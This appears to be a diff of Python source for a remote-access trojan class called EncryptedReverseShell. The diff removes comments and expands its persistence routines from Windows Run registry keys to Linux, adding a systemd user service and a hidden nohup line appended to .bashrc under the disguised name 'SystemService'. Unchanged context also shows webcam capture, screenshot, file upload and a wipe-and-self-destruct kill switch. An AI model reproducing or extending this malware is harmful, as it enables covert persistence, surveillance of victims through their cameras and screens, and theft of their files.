@@ -21,7 +21,6 @@ import psutil
 from PIL import ImageGrab
 import cv2
 
-# конфиг
 HOST = '127.0.0.1'
 
 class EncryptedReverseShell:
@@ -44,14 +43,13 @@ class EncryptedReverseShell:
                 codepage = kernel32.GetConsoleOutputCP()
                 
                 encoding_map = {
-                    866: 'cp866',    # Russian DOS
-                    1251: 'cp1251',  # Russian Windows
-                    65001: 'utf-8',  # UTF-8
-                    437: 'cp437',    # English DOS
+                    866: 'cp866',
+                    1251: 'cp1251',
+                    65001: 'utf-8',
+                    437: 'cp437',
                 }
                 return encoding_map.get(codepage, 'cp866')
             else:
-                # for Linux/Mac
                 return locale.getpreferredencoding() or 'utf-8'
         except:
             return 'utf-8'
@@ -252,13 +250,12 @@ class EncryptedReverseShell:
             return {"error": f"Screenshot failed: {str(e)}"}
 
     def list_cameras(self):
-        """Получение списка доступных камер"""
         try:
             cameras = []
-            for i in range(10):  # Проверяем первые 10 индексов
+            for i in range(10):
                 cap = cv2.VideoCapture(i)
+
                 if cap.isOpened():
-                    # Получаем информацию о камере
                     width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
                     height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
                     fps = cap.get(cv2.CAP_PROP_FPS)
@@ -284,10 +281,9 @@ class EncryptedReverseShell:
             if not camera.isOpened():
                 return {"error": f"Camera {camera_index} not available"}
             
-            time.sleep(1)  # Даем камере время на инициализацию
+            time.sleep(1)
             ret, frame = camera.read()
-            
-            # Получаем информацию о камере
+
             width = int(camera.get(cv2.CAP_PROP_FRAME_WIDTH))
             height = int(camera.get(cv2.CAP_PROP_FRAME_HEIGHT))
             
@@ -366,7 +362,7 @@ class EncryptedReverseShell:
                 return {"error": "Path is not a file"}
             
             file_size = os.path.getsize(file_path)
-            if file_size > 50 * 1024 * 1024:  # 50MB limit
+            if file_size > 50 * 1024 * 1024:
                 return {"error": "File too large (max 50MB)"}
             
             with open(file_path, 'rb') as f:
@@ -416,11 +412,11 @@ class EncryptedReverseShell:
         for _ in range(4):
             patterns.append([os.urandom(1) for _ in range(256)])
     
-        patterns.append([b'\x55'] * 256)  # 01010101
-        patterns.append([b'\xAA'] * 256)  # 10101010
-        patterns.append([b'\x92\x49\x24'] * 85 + [b'\x92'])  # 10010010...
-        patterns.append([b'\x49\x24\x92'] * 85 + [b'\x49'])  # 01001001...
-        patterns.append([b'\x24\x92\x49'] * 85 + [b'\x24'])  # 00100100...
+        patterns.append([b'\x55'] * 256)
+        patterns.append([b'\xAA'] * 256)
+        patterns.append([b'\x92\x49\x24'] * 85 + [b'\x92'])
+        patterns.append([b'\x49\x24\x92'] * 85 + [b'\x49'])
+        patterns.append([b'\x24\x92\x49'] * 85 + [b'\x24'])
     
         for _ in range(4):
             patterns.append([os.urandom(1) for _ in range(256)])
@@ -447,7 +443,6 @@ class EncryptedReverseShell:
         try:
             print("[+] Kill switch activated - self-destructing...")
             
-            # Удаляем из автозагрузки перед уничтожением
             self.remove_from_startup()
             
             if getattr(sys, 'frozen', False):
@@ -478,131 +473,275 @@ class EncryptedReverseShell:
                 os._exit(1)
 
     def add_to_startup(self, name="SystemService"):
-        """Добавление в автозагрузку через реестр"""
         try:
-            if platform.system() != "Windows":
-                return {"error": "Startup registry only available on Windows"}
-            
-            if not self.is_admin():
-                return {"error": "Administrator privileges required for startup registration"}
-            
-            # Получаем путь к текущему исполняемому файлу
             if getattr(sys, 'frozen', False):
                 executable_path = sys.executable
             else:
                 executable_path = f'"{sys.executable}" "{os.path.abspath(__file__)}"'
-            
-            # Добавляем в HKEY_CURRENT_USER (не требует админских прав)
-            try:
-                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
-                                    r"Software\Microsoft\Windows\CurrentVersion\Run", 
-                                    0, winreg.KEY_SET_VALUE)
-                winreg.SetValueEx(key, name, 0, winreg.REG_SZ, executable_path)
-                winreg.CloseKey(key)
-                user_startup = True
-            except Exception as e:
+
+            system = platform.system()
+
+            if system == "Windows":
+                if not self.is_admin():
+                    return {"error": "Administrator privileges required for startup registration"}
+                
                 user_startup = False
-                return {"error": f"User startup registration failed: {str(e)}"}
-            
-            # Добавляем в HKEY_LOCAL_MACHINE (требует админских прав)
-            try:
-                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
-                                    r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 
-                                    0, winreg.KEY_SET_VALUE)
-                winreg.SetValueEx(key, name, 0, winreg.REG_SZ, executable_path)
-                winreg.CloseKey(key)
-                system_startup = True
-            except:
+                try:
+                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
+                                        r"Software\Microsoft\Windows\CurrentVersion\Run", 
+                                        0, winreg.KEY_SET_VALUE)
+                    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, executable_path)
+                    winreg.CloseKey(key)
+                    user_startup = True
+                except Exception as e:
+                    return {"error": f"User startup registration failed: {str(e)}"}
+
                 system_startup = False
-            
-            return {
-                "success": True,
-                "message": f"Added to startup as '{name}'",
-                "user_startup": user_startup,
-                "system_startup": system_startup
-            }
-            
+                try:
+                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
+                                        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 
+                                        0, winreg.KEY_SET_VALUE)
+                    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, executable_path)
+                    winreg.CloseKey(key)
+                    system_startup = True
+                except:
+                    pass
+                
+                return {
+                    "success": True,
+                    "message": f"Added to startup as '{name}'",
+                    "user_startup": user_startup,
+                    "system_startup": system_startup,
+                    "platform": "Windows"
+                }
+
+            elif system == "Linux":
+                home_dir = os.path.expanduser("~")
+                service_dir = os.path.join(home_dir, ".config", "systemd", "user")
+                service_file = os.path.join(service_dir, f"{name}.service")
+                
+                try:
+                    if not os.path.exists(service_dir):
+                        os.makedirs(service_dir)
+                except Exception as e:
+                    return {"error": f"Cannot create service directory: {str(e)}"}
+
+                if getattr(sys, 'frozen', False):
+                    exec_cmd = executable_path
+                else:
+                    exec_cmd = f"{sys.executable} {os.path.abspath(__file__)}"
+
+                service_content = f"""[Unit]
+Description={name} Service
+After=network.target
+
+[Service]
+ExecStart={exec_cmd}
+Restart=always
+RestartSec=10
+WorkingDirectory={os.path.dirname(os.path.abspath(__file__)) if not getattr(sys, 'frozen', False) else '/'}
+
+[Install]
+WantedBy=default.target
+"""
+                systemd_enabled = False
+                try:
+                    with open(service_file, 'w') as f:
+                        f.write(service_content)
+                    
+                    subprocess.run(['systemctl', '--user', 'daemon-reload'], capture_output=True)
+                    subprocess.run(['systemctl', '--user', 'enable', f'{name}.service'], capture_output=True)
+                    subprocess.run(['systemctl', '--user', 'start', f'{name}.service'], capture_output=True)
+                    
+                    check_result = subprocess.run(['systemctl', '--user', 'is-active', f'{name}.service'], 
+                                                capture_output=True, text=True)
+                    systemd_enabled = (check_result.stdout.strip() == 'active')
+                except:
+                    systemd_enabled = False
+
+                bashrc_enabled = False
+                try:
+                    bashrc_path = os.path.join(home_dir, ".bashrc")
+                    startup_line = f'\n# {name}\n(cd /tmp; nohup {exec_cmd} > /dev/null 2>&1 &)\n'
+                    
+                    if os.path.exists(bashrc_path):
+                        with open(bashrc_path, 'r') as f:
+                            content = f.read()
+                        if f"# {name}" not in content:
+                            with open(bashrc_path, 'a') as f:
+                                f.write(startup_line)
+                        bashrc_enabled = True
+                    else:
+                        with open(bashrc_path, 'w') as f:
+                            f.write(startup_line)
+                        bashrc_enabled = True
+                except:
+                    bashrc_enabled = False
+
+                message = f"Added to startup as '{name}'"
+                if systemd_enabled:
+                    message += " (systemd active)"
+                elif os.path.exists(service_file):
+                    message += " (systemd installed but inactive)"
+                if bashrc_enabled:
+                    message += " (.bashrc)"
+                
+                return {
+                    "success": systemd_enabled or bashrc_enabled,
+                    "message": message,
+                    "systemd_enabled": systemd_enabled,
+                    "bashrc_enabled": bashrc_enabled,
+                    "platform": "Linux"
+                }
+            else:
+                return {"error": f"Unsupported platform: {system}"}
+
         except Exception as e:
             return {"error": f"Startup registration failed: {str(e)}"}
     
     def remove_from_startup(self, name="SystemService"):
-        """Удаление из автозагрузки"""
         try:
-            if platform.system() != "Windows":
-                return {"error": "Startup registry only available on Windows"}
+            system = platform.system()
             
-            removed = []
-            
-            # Удаляем из HKEY_CURRENT_USER
-            try:
-                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
-                                    r"Software\Microsoft\Windows\CurrentVersion\Run", 
-                                    0, winreg.KEY_SET_VALUE)
-                winreg.DeleteValue(key, name)
-                winreg.CloseKey(key)
-                removed.append("HKEY_CURRENT_USER")
-            except:
-                pass
-            
-            # Удаляем из HKEY_LOCAL_MACHINE
-            try:
-                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
-                                    r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 
-                                    0, winreg.KEY_SET_VALUE)
-                winreg.DeleteValue(key, name)
-                winreg.CloseKey(key)
-                removed.append("HKEY_LOCAL_MACHINE")
-            except:
-                pass
-            
-            if removed:
-                return {"success": True, "message": f"Removed from startup: {', '.join(removed)}"}
+            if system == "Windows":
+                removed = []
+                try:
+                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
+                                        r"Software\Microsoft\Windows\CurrentVersion\Run", 
+                                        0, winreg.KEY_SET_VALUE)
+                    winreg.DeleteValue(key, name)
+                    winreg.CloseKey(key)
+                    removed.append("HKEY_CURRENT_USER")
+                except:
+                    pass
+
+                try:
+                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
+                                        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 
+                                        0, winreg.KEY_SET_VALUE)
+                    winreg.DeleteValue(key, name)
+                    winreg.CloseKey(key)
+                    removed.append("HKEY_LOCAL_MACHINE")
+                except:
+                    pass
+                
+                if removed:
+                    return {"success": True, "message": f"Removed from startup: {', '.join(removed)}"}
+                else:
+                    return {"message": "Not found in startup"}
+
+            elif system == "Linux":
+                home_dir = os.path.expanduser("~")
+                service_file = os.path.join(home_dir, ".config", "systemd", "user", f"{name}.service")
+                results = []
+                
+                try:
+                    subprocess.run(['systemctl', '--user', 'stop', f'{name}.service'], capture_output=True)
+                    subprocess.run(['systemctl', '--user', 'disable', f'{name}.service'], capture_output=True)
+                    
+                    if os.path.exists(service_file):
+                        os.remove(service_file)
+                        subprocess.run(['systemctl', '--user', 'daemon-reload'], capture_output=True)
+                        results.append("systemd service removed")
+                    else:
+                        results.append("systemd service not found")
+                except:
+                    results.append("systemd removal attempted")
+                
+                try:
+                    bashrc_path = os.path.join(home_dir, ".bashrc")
+                    if os.path.exists(bashrc_path):
+                        with open(bashrc_path, 'r') as f:
+                            lines = f.readlines()
+                        marker = f"# {name}"
+                        new_lines = []
+                        skip = False
+                        for line in lines:
+                            if marker in line:
+                                skip = True
+                            elif skip:
+                                if line.strip().startswith('(') or line.strip().startswith('nohup'):
+                                    skip = False
+                                    continue
+                                skip = False
+                            if not skip:
+                                new_lines.append(line)
+                        
+                        if len(new_lines) < len(lines):
+                            with open(bashrc_path, 'w') as f:
+                                f.writelines(new_lines)
+                            results.append(".bashrc cleaned")
+                        else:
+                            results.append(".bashrc entry not found")
+                    else:
+                        results.append(".bashrc not found")
+                except:
+                    results.append(".bashrc removal attempted")
+                
+                return {"success": True, "message": f"Removed from startup: {'; '.join(results)}"}
             else:
-                return {"message": "Not found in startup"}
+                return {"error": f"Unsupported platform: {system}"}
                 
         except Exception as e:
             return {"error": f"Startup removal failed: {str(e)}"}
     
     def check_startup_status(self, name="SystemService"):
-        """Проверка наличия в автозагрузке"""
         try:
-            if platform.system() != "Windows":
-                return {"error": "Startup registry only available on Windows"}
-            
-            status = {
-                "HKEY_CURRENT_USER": False,
-                "HKEY_LOCAL_MACHINE": False
-            }
-            
-            # Проверяем HKEY_CURRENT_USER
-            try:
-                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
-                                    r"Software\Microsoft\Windows\CurrentVersion\Run", 
-                                    0, winreg.KEY_READ)
+            system = platform.system()
+            status = {}
+
+            if system == "Windows":
+                status["HKEY_CURRENT_USER"] = False
+                status["HKEY_LOCAL_MACHINE"] = False
+                
                 try:
-                    value, _ = winreg.QueryValueEx(key, name)
-                    status["HKEY_CURRENT_USER"] = True
+                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
+                                        r"Software\Microsoft\Windows\CurrentVersion\Run", 
+                                        0, winreg.KEY_READ)
+                    try:
+                        value, _ = winreg.QueryValueEx(key, name)
+                        status["HKEY_CURRENT_USER"] = True
+                    except:
+                        pass
+                    winreg.CloseKey(key)
                 except:
                     pass
-                winreg.CloseKey(key)
-            except:
-                pass
-            
-            # Проверяем HKEY_LOCAL_MACHINE
-            try:
-                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
-                                    r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 
-                                    0, winreg.KEY_READ)
+                
                 try:
-                    value, _ = winreg.QueryValueEx(key, name)
-                    status["HKEY_LOCAL_MACHINE"] = True
+                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
+                                        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 
+                                        0, winreg.KEY_READ)
+                    try:
+                        value, _ = winreg.QueryValueEx(key, name)
+                        status["HKEY_LOCAL_MACHINE"] = True
+                    except:
+                        pass
+                    winreg.CloseKey(key)
                 except:
                     pass
-                winreg.CloseKey(key)
-            except:
-                pass
+
+            elif system == "Linux":
+                home_dir = os.path.expanduser("~")
+                status["systemd_service"] = False
+                status["bashrc_entry"] = False
+                
+                service_file = os.path.join(home_dir, ".config", "systemd", "user", f"{name}.service")
+                if os.path.exists(service_file):
+                    result = subprocess.run(['systemctl', '--user', 'is-active', f'{name}.service'], 
+                                          capture_output=True, text=True)
+                    status["systemd_service"] = (result.stdout.strip() == 'active')
+                else:
+                    status["systemd_service"] = False
+                
+                bashrc_path = os.path.join(home_dir, ".bashrc")
+                if os.path.exists(bashrc_path):
+                    with open(bashrc_path, 'r') as f:
+                        content = f.read()
+                    status["bashrc_entry"] = f"# {name}" in content
+                else:
+                    status["bashrc_entry"] = False
             
-            return {"startup_status": status}
+            return {"startup_status": status, "platform": system}
             
         except Exception as e:
             return {"error": f"Startup check failed: {str(e)}"}
